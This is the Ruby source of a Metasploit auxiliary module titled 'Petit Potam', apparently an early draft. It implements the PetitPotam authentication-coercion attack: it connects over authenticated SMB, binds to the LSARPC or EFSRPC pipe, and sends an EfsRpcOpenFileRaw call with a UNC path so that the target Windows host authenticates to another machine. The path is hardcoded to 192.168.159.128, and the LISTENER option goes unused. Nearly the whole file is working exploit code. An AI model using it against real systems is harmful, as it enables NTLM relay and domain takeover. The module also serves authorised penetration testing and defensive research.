##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'windows_error'
require 'ruby_smb'
require 'ruby_smb/error'

module EncryptingFileSystem
  # see: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/403c7ae0-1a3a-4e96-8efc-54e79a2cc451
  UUID = 'df1941c5-fe89-4e79-bf10-463657acf44d'.freeze
  VER_MAJOR = 1
  VER_MINOR = 0

  # Operation numbers
  EFS_RPC_OPEN_FILE_RAW = 0

  # [3.1.4.4.8 EfsRpcOpenFileRaw (Opnum 0)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/ccc4fb75-1c86-41d7-bbc4-b278ec13bfb8)
  class EfsRpcOpenFileRawRequest < BinData::Record
    attr_reader :opnum

    endian :little

    ndr_conf_var_wide_stringz :file_name
    ndr_uint32                :flags

    def initialize_instance
      super
      @opnum = EFS_RPC_OPEN_FILE_RAW
    end
  end

  class EfsRpcOpenFileRawResponse < BinData::Record
    attr_reader :opnum

    endian :little

    ndr_context_handle :h_context
    ndr_uint32         :error_status

    def initialize_instance
      super
      @opnum = EFS_RPC_OPEN_FILE_RAW
    end
  end
end

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::DCERPC
  include Msf::Exploit::Remote::SMB::Client::Authenticated
  include Msf::Auxiliary::Scanner

  PIPE_HANDLES = {
    lsarpc: {
      uuid: 'c681d488-d850-11d0-8c52-00c04fd90f7e'.freeze,
      opts: ['\\lsarpc'.freeze]
    },
    efsrpc: {
      uuid: EncryptingFileSystem::UUID,
      opts: ['\\efsrpc'.freeze]
    }
  }

  def initialize
    super(
      'Name' => 'Petit Potam',
      'Description' => %q{

      },
      'Author' => ['Spencer McIntyre'],
      'License' => MSF_LICENSE
    )

    register_options(
      [
        OptString.new('LISTENER', [ true, 'The host listening for the incoming connection', Rex::Socket.source_address ]),
        OptEnum.new('PIPE', [ true, 'The named pipe to use for triggering', 'lsarpc', PIPE_HANDLES.keys.map(&:to_s)])
      ]
    )
  end

  # Obtain information about a single host
  def run_host(_ip)
    connect
    smb_login

    handle_args = PIPE_HANDLES[datastore['PIPE'].to_sym]
    fail_with(Failure::BadConfig, 'Invalid pipe.') unless handle_args

    handle = dcerpc_handle(
      handle_args[:uuid],
      handle_args.fetch(:version, '1.0'),
      handle_args.fetch(:protocol, 'ncacn_np'),
      handle_args[:opts]
    )
    vprint_status("Binding to #{handle} ...")
    dcerpc_bind(handle)
    vprint_status("Bound to #{handle} ...")

    request = EncryptingFileSystem::EfsRpcOpenFileRawRequest.new(
      file_name: "\\\\192.168.159.128\\test\\Settings.ini\x00"
    )

    begin
      raw_response = dcerpc.call(request.opnum, request.to_binary_s)
    rescue Rex::Proto::DCERPC::Exceptions::Fault => e
      fail_with(Failure::UnexpectedReply, "The #{name} Encrypting File System RPC request failed (#{e.message}).")
    end
  end
end
